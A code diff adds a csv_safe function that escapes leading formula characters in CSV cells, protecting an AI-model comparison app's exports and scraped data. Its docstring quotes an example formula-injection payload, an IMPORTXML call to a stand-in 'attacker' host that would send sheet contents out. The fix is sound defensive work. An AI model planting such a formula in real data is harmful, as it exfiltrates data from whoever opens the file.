@@ -76,6 +76,33 @@ def apply_filters(df, providers, min_quality, search: str = "") -> pd.DataFrame:
 
 COMPARE_MAX = 5
 
+# Characters that make a spreadsheet treat a cell as a formula rather than text.
+_FORMULA_LEAD = ("=", "+", "-", "@", "\t", "\r")
+
+
+def csv_safe(df):
+    """Neutralise leading formula characters in text cells.
+
+    `to_csv` quotes for delimiters, and quoting does not stop Excel or Sheets
+    evaluating a cell that begins with `=`. The export is handed to the browser
+    as `ai_frontier_export.csv` — a filename that invites a spreadsheet — so a
+    scraped model name of `=IMPORTXML("https://attacker/?"&A1,"//a")` would run
+    on open and exfiltrate the sheet, with nothing on screen to suggest the name
+    was a formula.
+
+    Applied on export AND on the way into data/raw/*.csv, which the bot commits
+    hourly. The feed is clean today (0 cells starting `= + - @ \\t \\r`); this is
+    a choke point, not a reaction.
+    """
+    out = df.copy()
+    for col in out.columns:
+        if out[col].dtype != object:
+            continue
+        out[col] = out[col].map(
+            lambda v: "'" + v if isinstance(v, str) and v[:1] in _FORMULA_LEAD else v
+        )
+    return out
+
 _QUALITY_LADDER = [0, 10, 15, 20, 25, 30, 35, 40, 45, 50]
 
 
